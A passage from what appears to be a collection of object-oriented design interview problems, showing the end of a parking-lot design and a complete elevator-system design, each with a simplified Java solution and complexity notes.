**Example Input:** multi-level parking; different vehicle types

**Example Output:** ParkingLot.park() returns ticket; checkout() returns fee

**Explanation:** Entities: VehicleType, ParkingSpot, ParkingTicket, ParkingLot; spot search + hourly fee.

**Answer:**
```java
import java.util.*; import java.time.*;
enum VehicleType { TWO_WHEELER, CAR, TRUCK }
class ParkingSpot {
    final String id; final VehicleType type; boolean available = true;
    ParkingSpot(String id, VehicleType t) { this.id=id; type=t; }
}
class ParkingTicket {
    final String id = UUID.randomUUID().toString(); final ParkingSpot spot;
    final LocalDateTime entry = LocalDateTime.now();
    ParkingTicket(ParkingSpot s) { spot=s; }
}
class ParkingLot {
    private final List<ParkingSpot> spots = new ArrayList<>();
    void addSpot(ParkingSpot s) { spots.add(s); }
    ParkingTicket park(VehicleType type) {
        ParkingSpot s = spots.stream().filter(sp -> sp.type==type && sp.available)
            .findFirst().orElseThrow(() -> new RuntimeException("No spot for "+type));
        s.available = false;
        return new ParkingTicket(s);
    }
    double checkout(ParkingTicket t) {
        long hrs = Math.max(1, Duration.between(t.entry, LocalDateTime.now()).toHours());
        double rate = switch(t.spot.type){ case TWO_WHEELER->1.0; case CAR->2.0; case TRUCK->4.0; };
        t.spot.available = true;
        return hrs * rate;
    }
    long countAvailable(VehicleType type) {
        return spots.stream().filter(s -> s.type==type && s.available).count();
    }
}
```

> **Time:** O(spots) &nbsp; **Space:** O(spots)
---

### 1946. Design Elevator
**ID:** `LLD-1946`

**Problem:** Design Elevator.

**Example Input:** N floors, M elevators; assign nearest elevator

**Example Output:** Elevator moves to requested floor

**Explanation:** Elevator holds up/down queues; ElevatorController assigns nearest elevator to request.

**Answer:**
```java
import java.util.*;
enum Direction { UP, DOWN, IDLE }
class Elevator {
    int currentFloor = 0; Direction dir = Direction.IDLE; final int id;
    private final TreeSet<Integer> up   = new TreeSet<>();
    private final TreeSet<Integer> down = new TreeSet<>(Comparator.reverseOrder());
    Elevator(int id) { this.id = id; }
    void request(int floor) { if(floor>currentFloor) up.add(floor); else if(floor<currentFloor) down.add(floor); }
    void step() {
        if (dir==Direction.UP || (dir==Direction.IDLE && !up.isEmpty())) {
            if (!up.isEmpty()) { currentFloor=up.first(); up.remove(currentFloor);
                dir = up.isEmpty() ? (down.isEmpty()?Direction.IDLE:Direction.DOWN) : Direction.UP; }
        } else if (!down.isEmpty()) { currentFloor=down.first(); down.remove(currentFloor);
            dir = down.isEmpty() ? Direction.IDLE : Direction.DOWN; }
    }
    boolean isIdle() { return dir==Direction.IDLE; }
}
class ElevatorController {
    private final List<Elevator> elevators = new ArrayList<>();
    void addElevator(Elevator e) { elevators.add(e); }
    Elevator assign(int fromFloor) {
        return elevators.stream()
            .min(Comparator.comparingInt(e -> Math.abs(e.currentFloor - fromFloor)))
            .orElseThrow();
    }
    void assignAndRequest(int fromFloor, int toFloor) {
        Elevator e = assign(fromFloor);
        e.request(fromFloor);
        e.request(toFloor);
    }
}
```

> **Time:** O(log n) &nbsp; **Space:** O(floors)
